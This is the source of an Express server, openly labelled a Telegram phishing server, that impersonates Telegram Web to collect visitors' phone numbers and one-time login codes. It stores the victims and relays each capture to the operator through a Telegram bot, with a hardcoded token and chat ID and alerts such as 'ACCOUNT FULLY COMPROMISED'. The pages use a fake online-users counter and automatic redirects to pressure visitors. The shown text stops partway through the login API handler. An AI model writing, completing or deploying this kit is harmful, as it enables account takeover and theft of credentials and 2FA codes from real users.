// server.js - Complete Telegram Phishing Server for Vercel
// Deploy to Vercel: vercel --prod

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const http = require('http');

// Initialize Express
const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIGURATION ====================
const CONFIG = {
    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s',
    TELEGRAM_CHAT_ID: process.env.CHAT_ID || '6834832649',
    ADMIN_PASSWORD: process.env.ADMIN_PASS || 'admin123',
    SESSION_SECRET: crypto.randomBytes(32).toString('hex'),
    DATA_FILE: '/tmp/victims.json', // Vercel uses /tmp for persistence
    LOG_FILE: '/tmp/access.log',
    DOMAIN: process.env.VERCEL_URL || 'http://localhost:3000'
};

// ==================== DATA STORAGE ====================
class DataStore {
    constructor() {
        this.victims = new Map();
        this.sessions = new Map();
        this.loadData();
        setInterval(() => this.saveData(), 30000); // Auto-save every 30s
    }

    loadData() {
        try {
            if (fs.existsSync(CONFIG.DATA_FILE)) {
                const data = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
                this.victims = new Map(data.victims || []);
                console.log(`Loaded ${this.victims.size} victims from storage`);
            }
        } catch (err) {
            console.log('No previous data found, starting fresh');
        }
    }

    saveData() {
        try {
            const data = {
                victims: Array.from(this.victims.entries()),
                timestamp: new Date().toISOString()
            };
            fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(data, null, 2));
        } catch (err) {
            console.error('Error saving data:', err);
        }
    }

    addVictim(victimData) {
        const id = `victim_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
        victimData.id = id;
        victimData.timestamp = new Date().toISOString();
        victimData.ip = victimData.ip || 'unknown';
        
        this.victims.set(id, victimData);
        this.saveData();
        return victimData;
    }

    getVictims() {
        return Array.from(this.victims.values());
    }

    getVictim(id) {
        return this.victims.get(id);
    }

    createSession() {
        const sessionId = crypto.randomBytes(16).toString('hex');
        this.sessions.set(sessionId, {
            id: sessionId,
            createdAt: Date.now(),
            data: {}
        });
        return sessionId;
    }

    getSession(sessionId) {
        return this.sessions.get(sessionId);
    }

    updateSession(sessionId, data) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.data = { ...session.data, ...data };
            session.updatedAt = Date.now();
        }
    }
}

// Initialize data store
const db = new DataStore();

// ==================== TELEGRAM BOT ====================
class TelegramBotService {
    constructor() {
        this.bot = null;
        this.chatId = CONFIG.TELEGRAM_CHAT_ID;
        this.initialize();
    }

    initialize() {
        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
            console.warn('⚠️ Telegram bot token not set. Alerts will not be sent.');
            return;
        }

        try {
            this.bot = new TelegramBot(CONFIG.TELEGRAM_BOT_TOKEN, { polling: false });
            console.log('✅ Telegram bot initialized');
            
            // Test bot
            this.bot.getMe().then((botInfo) => {
                console.log(`🤖 Bot connected: @${botInfo.username}`);
                this.sendAlert('🚀 **Telegram Phishing Server Started**\nServer is now online and ready!');
            }).catch(err => {
                console.error('❌ Bot connection failed:', err.message);
            });
        } catch (err) {
            console.error('❌ Failed to initialize Telegram bot:', err);
        }
    }

    async sendAlert(message, victimData = null) {
        if (!this.bot || !this.chatId) return false;

        try {
            let fullMessage = message;
            if (victimData) {
                fullMessage += `\n\n📱 **Phone:** ${victimData.phone || 'N/A'}`;
                fullMessage += `\n🔑 **Password:** ${victimData.password || 'N/A'}`;
                fullMessage += `\n🔢 **OTP Code:** ${victimData.otp || 'N/A'}`;
                fullMessage += `\n🌐 **IP:** ${victimData.ip || 'N/A'}`;
                fullMessage += `\n🕐 **Time:** ${new Date().toLocaleTimeString()}`;
                fullMessage += `\n📊 **Total Victims:** ${db.victims.size}`;
            }

            await this.bot.sendMessage(this.chatId, fullMessage, { parse_mode: 'Markdown' });
            return true;
        } catch (err) {
            console.error('Failed to send Telegram alert:', err);
            return false;
        }
    }

    async sendLoginAlert(victimData) {
        const message = `🔔 **NEW VICTIM LOGIN** 🔔\n\n👤 Credentials captured successfully!`;
        return this.sendAlert(message, victimData);
    }

    async sendOTPAlert(victimData) {
        const message = `✅ **OTP CODE CAPTURED** ✅\n\n🔐 2FA verification code received!`;
        return this.sendAlert(message, victimData);
    }

    async sendCompleteAlert(victimData) {
        const message = `🎯 **ACCOUNT FULLY COMPROMISED** 🎯\n\n🏁 All authentication steps completed!`;
        return this.sendAlert(message, victimData);
    }
}

// Initialize Telegram bot
const telegramBot = new TelegramBotService();

// ==================== MIDDLEWARE ====================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Logging middleware
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const log = `${new Date().toISOString()} | ${ip} | ${req.method} ${req.url}\n`;
    
    // Log to file
    fs.appendFileSync(CONFIG.LOG_FILE, log, 'utf8');
    
    // Also log to console in development
    console.log(`📝 ${ip} - ${req.method} ${req.url}`);
    next();
});

// Session middleware
app.use((req, res, next) => {
    let sessionId = req.cookies?.session_id || req.query.session_id;
    
    if (!sessionId || !db.getSession(sessionId)) {
        sessionId = db.createSession();
        res.cookie('session_id', sessionId, { 
            httpOnly: true, 
            maxAge: 24 * 60 * 60 * 1000 
        });
    }
    
    req.sessionId = sessionId;
    req.session = db.getSession(sessionId)?.data || {};
    next();
});

// ==================== ROUTES ====================

// Serve HTML pages
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Web - Official</title>
        <link rel="icon" href="https://telegram.org/favicon.ico">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #40a4e0 0%, #2a92d2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                text-align: center;
            }
            .logo {
                width: 80px;
                height: 80px;
                background: #40a4e0;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                color: white;
                font-size: 40px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
                font-size: 28px;
            }
            p {
                color: #666;
                margin-bottom: 30px;
                line-height: 1.5;
            }
            .btn {
                display: block;
                width: 100%;
                padding: 15px;
                background: #40a4e0;
                color: white;
                text-decoration: none;
                border-radius: 10px;
                font-weight: 600;
                font-size: 16px;
                transition: all 0.3s;
                border: none;
                cursor: pointer;
                margin-top: 20px;
            }
            .btn:hover {
                background: #2a92d2;
                transform: translateY(-2px);
            }
            .features {
                text-align: left;
                margin: 30px 0;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 10px;
            }
            .features h3 {
                margin-bottom: 15px;
                color: #333;
            }
            .features ul {
                list-style: none;
                padding-left: 20px;
            }
            .features li {
                margin-bottom: 10px;
                color: #666;
                position: relative;
            }
            .features li:before {
                content: "✓";
                color: #40a4e0;
                position: absolute;
                left: -20px;
                font-weight: bold;
            }
            .live-counter {
                background: #e3f2fd;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                font-family: 'Courier New', monospace;
                font-size: 24px;
                font-weight: bold;
                color: #40a4e0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <span>✈️</span>
            </div>
            <h1>Telegram Web</h1>
            <p>Send and receive messages from any device with the official Telegram web client.</p>
            
            <div class="live-counter" id="userCounter">${db.victims.size + 1287} users online</div>
            
            <div class="features">
                <h3>Features:</h3>
                <ul>
                    <li>End-to-end encrypted chats</li>
                    <li>Sync across all devices</li>
                    <li>Fast and secure messaging</li>
                    <li>Voice and video calls</li>
                    <li>File sharing up to 2GB</li>
                </ul>
            </div>
            
            <a href="/login" class="btn">Start Messaging →</a>
            
            <p style="margin-top: 20px; font-size: 12px; color: #999;">
                By continuing, you agree to Telegram's <a href="#" style="color: #40a4e0;">Terms of Service</a>
            </p>
        </div>
        
        <script>
            // Live counter animation
            let count = ${db.victims.size + 1287};
            setInterval(() => {
                count += Math.floor(Math.random() * 3);
                document.getElementById('userCounter').textContent = count + ' users online';
            }, 3000);
            
            // Auto redirect after 5 seconds
            setTimeout(() => {
                window.location.href = '/login';
            }, 5000);
        </script>
    </body>
    </html>
    `);
});

// Login page
app.get('/login', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login • Telegram</title>
        <link rel="icon" href="https://telegram.org/favicon.ico">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .login-container {
                background: white;
                border-radius: 12px;
                padding: 40px;
                width: 100%;
                max-width: 380px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            }
            .logo {
                text-align: center;
                margin-bottom: 30px;
            }
            .logo span {
                font-size: 48px;
                color: #40a4e0;
            }
            h1 {
                text-align: center;
                color: #333;
                margin-bottom: 30px;
                font-size: 24px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #666;
                font-size: 14px;
                font-weight: 500;
            }
            input {
                width: 100%;
                padding: 15px;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                font-size: 16px;
                transition: all 0.3s;
            }
            input:focus {
                outline: none;
                border-color: #40a4e0;
                box-shadow: 0 0 0 3px rgba(64, 164, 224, 0.1);
            }
            .country-selector {
                display: flex;
                align-items: center;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                overflow: hidden;
            }
            .country-code {
                padding: 15px;
                background: #f8f9fa;
                border-right: 2px solid #e0e0e0;
                color: #333;
                font-weight: 500;
                min-width: 80px;
                text-align: center;
            }
            .country-selector input {
                border: none;
                border-radius: 0;
            }
            .btn {
                width: 100%;
                padding: 15px;
                background: #40a4e0;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 10px;
            }
            .btn:hover {
                background: #2a92d2;
            }
            .btn:disabled {
                background: #b2dffc;
                cursor: not-allowed;
            }
            .loader {
                display: none;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #40a4e0;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .error {
                color: #ff4444;
                font-size: 14px;
                margin-top: 10px;
                display: none;
            }
            .security-note {
                background: #e8f5e9;
                border: 1px solid #c8e6c9;
                border-radius: 8px;
                padding: 15px;
                margin: 20px 0;
                font-size: 14px;
                color: #2e7d32;
            }
            .qr-option {
                text-align: center;
                margin-top: 20px;
                padding-top: 20px;
                border-top: 1px solid #e0e0e0;
            }
            .qr-option a {
                color: #40a4e0;
                text-decoration: none;
                font-weight: 500;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <span>✈️</span>
            </div>
            <h1>Sign in to Telegram</h1>
            
            <div class="security-note">
                <strong>🔒 Secure Login</strong><br>
                Enter your phone number to receive a verification code via Telegram.
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label for="country">Country</label>
                    <select id="country" class="form-control" style="width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 8px;">
                        <option value="+1">United States (+1)</option>
                        <option value="+62" selected>Indonesia (+62)</option>
                        <option value="+91">India (+91)</option>
                        <option value="+44">UK (+44)</option>
                        <option value="+49">Germany (+49)</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="phone">Phone Number</label>
                    <div class="country-selector">
                        <div class="country-code" id="countryCode">+62</div>
                        <input type="tel" id="phone" placeholder="81234567890" required>
                    </div>
                </div>
                
                <div class="error" id="errorMessage"></div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText">Next</span>
                    <div class="loader" id="loader"></div>
                </button>
            </form>
            
            <div class="qr-option">
                <a href="#">Log in with QR Code →</a>
            </div>
            
            <p style="margin-top: 20px; font-size: 12px; color: #999; text-align: center;">
                By signing in, you agree to our <a href="#" style="color: #40a4e0;">Privacy Policy</a> and <a href="#" style="color: #40a4e0;">Terms of Service</a>.
            </p>
        </div>
        
        <script>
            // Update country code
            document.getElementById('country').addEventListener('change', function() {
                document.getElementById('countryCode').textContent = this.value;
            });
            
            // Form submission
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const phone = document.getElementById('phone').value;
                const countryCode = document.getElementById('country').value;
                const fullPhone = countryCode + phone;
                
                if (!phone || phone.length < 8) {
                    showError('Please enter a valid phone number');
                    return;
                }
                
                // Show loading
                const btn = document.getElementById('submitBtn');
                const btnText = document.getElementById('btnText');
                const loader = document.getElementById('loader');
                
                btn.disabled = true;
                btnText.style.display = 'none';
                loader.style.display = 'block';
                
                // Send data to server
                try {
                    const response = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            phone: fullPhone,
                            session_id: getCookie('session_id')
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        // Store phone in session
                        sessionStorage.setItem('phone', fullPhone);
                        sessionStorage.setItem('password', data.password || '');
                        
                        // Redirect to OTP page
                        setTimeout(() => {
                            window.location.href = '/otp?phone=' + encodeURIComponent(fullPhone);
                        }, 1000);
                    } else {
                        showError(data.error || 'Login failed. Please try again.');
                        btn.disabled = false;
                        btnText.style.display = 'inline';
                        loader.style.display = 'none';
                    }
                } catch (error) {
                    showError('Network error. Please check your connection.');
                    btn.disabled = false;
                    btnText.style.display = 'inline';
                    loader.style.display = 'none';
                }
            });
            
            function showError(message) {
                const errorDiv = document.getElementById('errorMessage');
                errorDiv.textContent = message;
                errorDiv.style.display = 'block';
                setTimeout(() => errorDiv.style.display = 'none', 5000);
            }
            
            function getCookie(name) {
                const value = \`; \${document.cookie}\`;
                const parts = value.split(\`; \${name}=\`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            
            // Auto-focus phone input
            document.getElementById('phone').focus();
        </script>
    </body>
    </html>
    `);
});

// OTP Verification page
app.get('/otp', (req, res) => {
    const phone = req.query.phone || '+628123456789';
    const maskedPhone = phone.replace(/(\+\d{2})(\d{3})(\d{4})(\d+)/, '$1-$2-***-$4');
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Verification Code • Telegram</title>
        <link rel="icon" href="https://telegram.org/favicon.ico">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .otp-container {
                background: white;
                border-radius: 12px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.1);
                text-align: center;
            }
            .logo {
                font-size: 48px;
                color: #40a4e0;
                margin-bottom: 20px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
                font-size: 24px;
            }
            .subtitle {
                color: #666;
                margin-bottom: 30px;
                line-height: 1.5;
            }
            .phone-display {
                background: #f8f9fa;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 500;
                color: #333;
            }
            .otp-inputs {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin: 30px 0;
            }
            .otp-input {
                width: 50px;
                height: 60px;
                text-align: center;
                font-size: 24px;
                font-weight: bold;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                background: white;
                transition: all 0.3s;
            }
            .otp-input:focus {
                outline: none;
                border-color: #40a4e0;
                box-shadow: 0 0 0 3px rgba(64, 164, 224, 0.1);
            }
            .otp-input.filled {
                border-color: #40a4e0;
                background: #e8f5e9;
            }
            .btn {
                width: 100%;
                padding: 15px;
                background: #40a4e0;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 20px;
            }
            .btn:hover {
                background: #2a92d2;
            }
            .btn:disabled {
                background: #b2dffc;
                cursor: not-allowed;
            }
            .loader {
                display: none;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #40a4e0;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .error {
                color: #ff4444;
                font-size: 14px;
                margin: 10px 0;
                display: none;
            }
            .success {
                color: #4CAF50;
                font-size: 14px;
                margin: 10px 0;
                display: none;
            }
            .resend {
                margin-top: 20px;
                color: #666;
                font-size: 14px;
            }
            .resend a {
                color: #40a4e0;
                text-decoration: none;
                font-weight: 500;
                cursor: pointer;
            }
            .resend a.disabled {
                color: #999;
                cursor: not-allowed;
            }
            .countdown {
                color: #40a4e0;
                font-weight: bold;
                font-family: 'Courier New', monospace;
            }
            .simulated-sms {
                background: #e8f5e9;
                border: 1px solid #c8e6c9;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
                position: relative;
            }
            .sms-header {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
                color: #2e7d32;
            }
            .sms-header span:first-child {
                font-size: 24px;
                margin-right: 10px;
                color: #4CAF50;
            }
            .sms-code {
                display: inline-block;
                background: white;
                color: #333;
                padding: 10px 20px;
                border-radius: 6px;
                font-family: 'Courier New', monospace;
                font-size: 20px;
                font-weight: bold;
                letter-spacing: 5px;
                margin: 10px 0;
                cursor: pointer;
                border: 2px dashed #4CAF50;
            }
            .sms-code:hover {
                background: #f1f8e9;
            }
        </style>
    </head>
    <body>
        <div class="otp-container">
            <div class="logo">✈️</div>
            <h1>Enter Verification Code</h1>
            <div class="subtitle">
                We've sent a 5-digit code to your Telegram app on another device.
            </div>
            
            <div class="phone-display">
                📱 Phone: ${maskedPhone}
            </div>
            
            <!-- Simulated SMS -->
            <div class="simulated-sms">
                <div class="sms-header">
                    <span>📱</span>
                    <div>
                        <strong>Telegram</strong><br>
                        <small>Just now • SMS</small>
                    </div>
                </div>
                <p>Your Telegram verification code is:</p>
                <div class="sms-code" id="fakeCode">${Math.floor(10000 + Math.random() * 90000)}</div>
                <p><small>Enter this code in the verification window.</small></p>
            </div>
            
            <form id="otpForm">
                <div class="otp-inputs">
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" required autofocus>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" required>
                    <input type="hidden" id="fullCode" name="code">
                </div>
                
                <div class="error" id="errorMessage"></div>
                <div class="success" id="successMessage"></div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText">Verify Code</span>
                    <div class="loader" id="loader"></div>
                </button>
                
                <div class="resend">
                    Didn't receive the code? 
                    <a id="resendLink" onclick="resendCode()">Resend code</a>
                    <span id="countdown"> (60s)</span>
                </div>
            </form>
            
            <p style="margin-top: 30px; font-size: 12px; color: #999;">
                The code will expire in 5 minutes. Make sure you're entering the code from your Telegram app.
            </p>
        </div>
        
        <script>
            const phone = '${phone}';
            const inputs = document.querySelectorAll('.otp-input');
            const fullCodeInput = document.getElementById('fullCode');
            const fakeCode = document.getElementById('fakeCode').textContent;
            
            // Auto-focus and auto-tab
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    updateFullCode();
                    updateInputStyles();
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                    updateFullCode();
                    updateInputStyles();
                });
                
                // Paste handling
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasted = e.clipboardData.getData('text').replace(/\D/g, '');
                    if (pasted.length === 5) {
                        for (let i = 0; i < 5; i++) {
                            if (inputs[i]) {
                                inputs[i].value = pasted[i];
                                inputs[i].classList.add('filled');
                            }
                        }
                        updateFullCode();
                        inputs[4].focus();
                    }
                });
            });
            
            function updateFullCode() {
                const code = Array.from(inputs).map(i => i.value).join('');
                fullCodeInput.value = code;
            }
            
            function updateInputStyles() {
                inputs.forEach(input => {
                    if (input.value) {
                        input.classList.add('filled');
                    } else {
                        input.classList.remove('filled');
                    }
                });
            }
            
            // Auto-fill from fake code
            fakeCode.addEventListener('click', function() {
                const code = this.textContent;
                for (let i = 0; i < 5; i++) {
                    if (inputs[i]) {
                        inputs[i].value = code[i];
                        inputs[i].classList.add('filled');
                    }
                }
                updateFullCode();
                inputs[0].focus();
            });
            
            // Countdown timer
            let countdown = 60;
            const countdownElement = document.getElementById('countdown');
            const resendLink = document.getElementById('resendLink');
            
            function updateCountdown() {
                if (countdown > 0) {
                    countdownElement.textContent = \` (\${countdown}s)\`;
                    resendLink.classList.add('disabled');
                    resendLink.style.pointerEvents = 'none';
                    countdown--;
                } else {
                    countdownElement.textContent = '';
                    resendLink.classList.remove('disabled');
                    resendLink.style.pointerEvents = 'auto';
                }
            }
            
            setInterval(updateCountdown, 1000);
            updateCountdown();
            
            function resendCode() {
                if (countdown > 0) return;
                
                // Generate new fake code
                const newCode = Math.floor(10000 + Math.random() * 90000);
                fakeCode.textContent = newCode;
                
                // Reset countdown
                countdown = 60;
                updateCountdown();
                
                // Show message
                const originalText = resendLink.textContent;
                resendLink.textContent = 'Code sent!';
                setTimeout(() => {
                    resendLink.textContent = originalText;
                }, 2000);
            }
            
            // Form submission
            document.getElementById('otpForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const code = fullCodeInput.value;
                if (code.length !== 5 || !/^\d+$/.test(code)) {
                    showError('Please enter a valid 5-digit code');
                    return;
                }
                
                // Show loading
                const btn = document.getElementById('submitBtn');
                const btnText = document.getElementById('btnText');
                const loader = document.getElementById('loader');
                const successMsg = document.getElementById('successMessage');
                
                btn.disabled = true;
                btnText.style.display = 'none';
                loader.style.display = 'block';
                
                try {
                    const response = await fetch('/api/verify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            phone: phone,
                            code: code,
                            session_id: getCookie('session_id')
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        successMsg.textContent = '✓ Code verified successfully!';
                        successMsg.style.display = 'block';
                        
                        // Redirect to success page
                        setTimeout(() => {
                            window.location.href = '/success';
                        }, 1500);
                    } else {
                        showError(data.error || 'Invalid code. Please try again.');
                        btn.disabled = false;
                        btnText.style.display = 'inline';
                        loader.style.display = 'none';
                    }
                } catch (error) {
                    showError('Verification failed. Please try again.');
                    btn.disabled = false;
                    btnText.style.display = 'inline';
                    loader.style.display = 'none';
                }
            });
            
            function showError(message) {
                const errorDiv = document.getElementById('errorMessage');
                errorDiv.textContent = message;
                errorDiv.style.display = 'block';
                setTimeout(() => errorDiv.style.display = 'none', 5000);
            }
            
            function getCookie(name) {
                const value = \`; \${document.cookie}\`;
                const parts = value.split(\`; \${name}=\`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            
            // Auto-focus first input
            inputs[0].focus();
        </script>
    </body>
    </html>
    `);
});

// Success page
app.get('/success', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Welcome to Telegram</title>
        <link rel="icon" href="https://telegram.org/favicon.ico">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .success-container {
                background: white;
                border-radius: 20px;
                padding: 50px 40px;
                width: 100%;
                max-width: 500px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            .success-container::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 5px;
                background: linear-gradient(90deg, #4CAF50, #8BC34A);
            }
            .success-icon {
                font-size: 80px;
                color: #4CAF50;
                margin-bottom: 20px;
                animation: bounce 1s;
            }
            @keyframes bounce {
                0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
                40% {transform: translateY(-20px);}
                60% {transform: translateY(-10px);}
            }
            h1 {
                color: #333;
                margin-bottom: 15px;
                font-size: 32px;
            }
            .subtitle {
                color: #666;
                font-size: 18px;
                margin-bottom: 30px;
                line-height: 1.5;
            }
            .features {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
                margin: 30px 0;
            }
            .feature {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
            }
            .feature i {
                font-size: 24px;
                color: #40a4e0;
                margin-bottom: 10px;
                display: block;
            }
            .btn {
                display: inline-block;
                padding: 15px 30px;
                background: #40a4e0;
                color: white;
                text-decoration: none;
                border-radius: 10px;
                font-weight: 600;
                font-size: 16px;
                transition: all 0.3s;
                margin: 20px 10px;
                border: none;
                cursor: pointer;
            }
            .btn:hover {
                background: #2a92d2;
                transform: translateY(-2px);
            }
            .btn-secondary {
                background: #f8f9fa;
                color: #333;
                border: 1px solid #ddd;
            }
            .btn-secondary:hover {
                background: #e9ecef;
            }
            .confetti {
                position: absolute;
                width: 10px;
                height: 10px;
                background: #40a4e0;
                border-radius: 50%;
                opacity: 0;
            }
            .countdown {
                font-family: 'Courier New', monospace;
                font-size: 20px;
                color: #40a4e0;
                margin: 20px 0;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="success-container" id="successContainer">
            <div class="success-icon">
                ✈️
            </div>
            <h1>Welcome to Telegram!</h1>
            <div class="subtitle">
                Your account has been successfully verified and is now ready to use.
            </div>
            
            <div class="countdown" id="countdown">
                Redirecting to Telegram in 5 seconds...
            </div>
            
            <div class="features">
                <div class="feature">
                    <span>🔒</span>
                    <div>Secure Chats</div>
                </div>
                <div class="feature">
                    <span>🚀</span>
                    <div>Fast Messages</div>
                </div>
                <div class="feature">
                    <span>📁</span>
                    <div>File Sharing</div>
                </div>
                <div class="feature">
                    <span>👥</span>
                    <div>Groups & Channels</div>
                </div>
            </div>
            
            <div>
                <a href="https://telegram.org/" class="btn" target="_blank">
                    Open Telegram Web
                </a>
                <button class="btn btn-secondary" onclick="downloadApp()">
                    Download Desktop App
                </button>
            </div>
            
            <p style="margin-top: 30px; font-size: 14px; color: #999;">
                Need help? Visit our <a href="https://telegram.org/faq" style="color: #40a4e0;">Help Center</a>
            </p>
        </div>
        
        <script>
            // Create confetti effect
            function createConfetti() {
                const container = document.getElementById('successContainer');
                const colors = ['#40a4e0', '#4CAF50', '#FF9800', '#E91E63', '#9C27B0'];
                
                for (let i = 0; i < 50; i++) {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * 100 + '%';
                    confetti.style.top = '-10px';
                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.width = Math.random() * 10 + 5 + 'px';
                    confetti.style.height = confetti.style.width;
                    
                    container.appendChild(confetti);
                    
                    // Animate
                    const duration = Math.random() * 3000 + 2000;
                    confetti.animate([
                        { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
                        { transform: \`translateY(\${window.innerHeight}px) rotate(\${Math.random() * 360}deg)\`, opacity: 0 }
                    ], {
                        duration: duration,
                        easing: 'cubic-bezier(0.215, 0.61, 0.355, 1)'
                    }).onfinish = () => confetti.remove();
                }
            }
            
            // Initial confetti burst
            setTimeout(createConfetti, 500);
            setInterval(createConfetti, 3000);
            
            // Countdown redirect
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            
            function updateCountdown() {
                countdownElement.textContent = \`Redirecting to Telegram in \${countdown} seconds...\`;
                
                if (countdown <= 0) {
                    window.location.href = 'https://web.telegram.org/';
                } else {
                    countdown--;
                    setTimeout(updateCountdown, 1000);
                }
            }
            
            updateCountdown();
            
            function downloadApp() {
                alert('Redirecting to Telegram download page...');
                window.open('https://desktop.telegram.org/', '_blank');
            }
            
            // Send analytics
            fetch('/api/complete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: getCookie('session_id')
                })
            });
            
            function getCookie(name) {
                const value = \`; \${document.cookie}\`;
                const parts = value.split(\`; \${name}=\`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
        </script>
    </body>
    </html>
    `);
});

// ==================== API ROUTES ====================

// Login API
app.post('/api/login', (req, res) => {
    const { phone, session_id } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!phone || !session_id) {
